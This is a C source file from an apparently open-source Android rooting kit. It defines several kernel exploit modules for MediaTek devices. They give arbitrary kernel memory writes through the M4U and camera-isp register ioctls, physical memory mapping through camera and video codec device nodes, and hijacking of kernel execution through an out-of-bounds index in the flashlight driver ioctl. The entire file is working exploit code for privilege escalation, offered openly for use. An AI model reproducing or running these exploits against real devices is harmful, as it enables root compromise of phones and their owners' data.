/*****************************************************************************
 * Copyright (C) 2013-2014 Ming Hu tewilove<at>gmail.com
 *
 * This file is part of RootSDK.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation; either version 2.1 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
 *****************************************************************************/


#include "log.h"
#include "exploit.h"
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define MTK_M4U_MAGICNO 'g'
#define MTK_M4U_T_REG_SET             _IOW(MTK_M4U_MAGICNO, 24, int)

struct m4u_t_reg_set {
    unsigned int addr;
    unsigned int val;
};

static int mtk_M4U_init(void **opaque) {
    int fd;

    *opaque = (void *) -1;
    fd = open("/dev/M4U_device", O_RDONLY);
    if (fd < 0) {
        //LOGE("open()");
        return -1;
    }
    *opaque = (void *) fd;
    return 0;
}

static void mtk_M4U_free(void **opaque) {
    if ((int)(*opaque) >= 0)
        close((int)(*opaque));
    *opaque = (void *) -1;
}

static int mtk_M4U_write32(void *opaque, long addr, long val) {
    int rc, fd = (int) opaque;
    struct m4u_t_reg_set payload;

    payload.addr = addr;
    payload.val = val;
    rc = ioctl(fd, MTK_M4U_T_REG_SET, &payload);
    if (rc < 0)
        LOGE("ioctl()");
    return rc;
}

exploit_t EXPLOIT_mtk_M4U = {
    .name = "MTK M4U",
    .flags = EXPLOIT_POKE_TEXT,
    .init = mtk_M4U_init,
    .free = mtk_M4U_free,
    .write32 = mtk_M4U_write32,
};

struct private_data_mmap {
    int fd;
    void *mapped;
    int size;
    int index;
};

static int mtk_mmap_init(void **opaque) {
    struct private_data_mmap *p;

    *opaque = malloc(sizeof(struct private_data_mmap));
    if (!*opaque)
        return -1;
    p = (struct private_data_mmap *)(*opaque);
    p->fd = -1;
    p->mapped = MAP_FAILED;
    p->size = 0;
    p->index = 0;
    return 0;
}

static void *mtk_mmap_mmap(void *opaque, long addr, long size) {
    struct private_data_mmap *p = (struct private_data_mmap *) opaque;
    const char *devices[] = {
        "/dev/camera-sysram",
        "/dev/camera-isp",
        "/dev/mt6573-SYSRAM",
        "/dev/mt6573-MDP",
        "/dev/mt6575-SYSRAM",
        "/dev/mt6575-isp",
        "/dev/mt6575-MDP",
        "/dev/mt6575-eis",
        "/dev/camera-eis",
        "/dev/Vcodec",
        0
    };
    int rc, fd, i;

    p->mapped = MAP_FAILED;
    p->size = 0;
    for (i = p->index; devices[i]; i++) {
        fd = open(devices[i], O_RDWR);
        if (fd < 0) {
            // LOGE("open()");
            continue;
        }
        rc = exploit_generic_mmap(fd, addr, size, &p->mapped);
        if (!rc) {
            p->index = i + 1;
            p->size = size;
            return p->mapped;
        }
        close(fd);
    }
    return MAP_FAILED;
}

static void mtk_mmap_free(void **opaque) {
    struct private_data_mmap *p = (struct private_data_mmap *)(*opaque);

    if (p->mapped && p->mapped != MAP_FAILED) {
        munmap(p->mapped, p->size);
    }
    if (p->fd >= 0)
        close(p->fd);
    free(p);
}

exploit_t EXPLOIT_mtk_mmap = {
    .name = "MTK mmap",
    .init = mtk_mmap_init,
    .free = mtk_mmap_free,
    .mmap = mtk_mmap_mmap,
};

#define ISP_ADDR_CAMINF 0xF5000000

typedef struct
{
    unsigned int Addr;   // register's addr
    unsigned int Val;    // register's value
}ISP_REG_STRUCT;

typedef struct
{
    unsigned int Data;   // pointer to ISP_REG_STRUCT
    unsigned int Count;  // count
}ISP_REG_IO_STRUCT;

#define ISP_CMD_WRITE_REG   3
#define ISP_MAGIC           'k'
#define ISP_WRITE_REGISTER  _IOWR(ISP_MAGIC, ISP_CMD_WRITE_REG, ISP_REG_IO_STRUCT)

static int mtk_camera_isp_init(void **opaque) {
    int fd;

    *opaque = (void *)(-1);
    fd = open("/dev/camera-isp", O_RDWR);
    if (fd < 0) {
        // LOGE("open");
        return -1;
    }
    *opaque = (void *) fd;
    return 0;
}

static void mtk_camera_isp_free(void **opaque) {
    int fd;

    fd = (int)(*opaque);
    if (fd >= 0)
        close(fd);
}

static int mtk_camera_isp_write32(void *opaque, long addr, long val) {
    int rc;
    ISP_REG_STRUCT info;
    ISP_REG_IO_STRUCT args;

    info.Addr = (unsigned int) addr - ISP_ADDR_CAMINF;
    info.Val = (unsigned int) val;
    args.Data = (unsigned int) &info;
    args.Count = 1;

    rc = ioctl((int) opaque, ISP_WRITE_REGISTER, &args);
    if (rc < 0) {
        LOGE("ioctl()");
        return -1;
    }
    // XXX: wtf
    // usleep(1000 * 1000);
    return 0;
}

exploit_t EXPLOIT_mtk_camera_isp = {
    .name = "MTK camera_isp",
    .flags = EXPLOIT_POKE_TEXT,
    .init = mtk_camera_isp_init,
    .free = mtk_camera_isp_free,
    .write32 = mtk_camera_isp_write32,
};

#define FLASHLIGHT_MAGIC 'S'
#define FLASHLIGHTIOC_X_SET_DRIVER _IOWR(FLASHLIGHT_MAGIC,30,unsigned long)

struct private_data_camera_fl {
    int fd;
    void *mapped;
};

static int mtk_camera_fl_init(void **opaque) {
    struct private_data_camera_fl *p;

    p = (struct private_data_camera_fl *) malloc(sizeof(*p));
    if (!p)
        return -1;
    p->fd = open("/dev/kd_camera_flashlight", O_RDWR);
    if (p->fd < 0)
        goto bail_open;
    // assume 0x20000000~0x2ffffffff is not used
    p->mapped = mmap((void *) 0x20000000, 0x10000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, 0, 0);
    if (p->mapped == MAP_FAILED)
        goto bail_mmap;
    *opaque = p;
    return 0;
bail_mmap:
    close(p->fd);
bail_open:
    free(p);
    return -1;
}

static int mtk_camera_fl_invoke(void *opaque, long addr) {
    struct private_data_camera_fl *p = (struct private_data_camera_fl *) opaque;
    int rc, i, idx;

    // assume kernel is at 0xc0000000
    // assume sizeof(KD_FLASHLIGHT_INIT_FUNCTION_STRUCT) == 8
    for (i = 0; i < 0x10000000; i += sizeof(long)) {
        *((long *) p->mapped + i) = addr;
    }
    msync(p->mapped, 0x10000000, MS_SYNC);
    idx = 0x60000000 / 8; // 0x100000000 - 0xc0000000 + 0x2000000
    rc = ioctl(p->fd, FLASHLIGHTIOC_X_SET_DRIVER, &idx);
    return rc == -EIO ? 0 : -1;
}

static void mtk_camera_fl_free(void **opaque) {
    struct private_data_camera_fl *p = (struct private_data_camera_fl *)(*opaque);

    munmap(p->mapped, 0x10000000);
    close(p->fd);
}

exploit_t EXPLOIT_mtk_camera_fl = {
    .init = mtk_camera_fl_init,
    .invoke = mtk_camera_fl_invoke,
    .free = mtk_camera_fl_free,
};
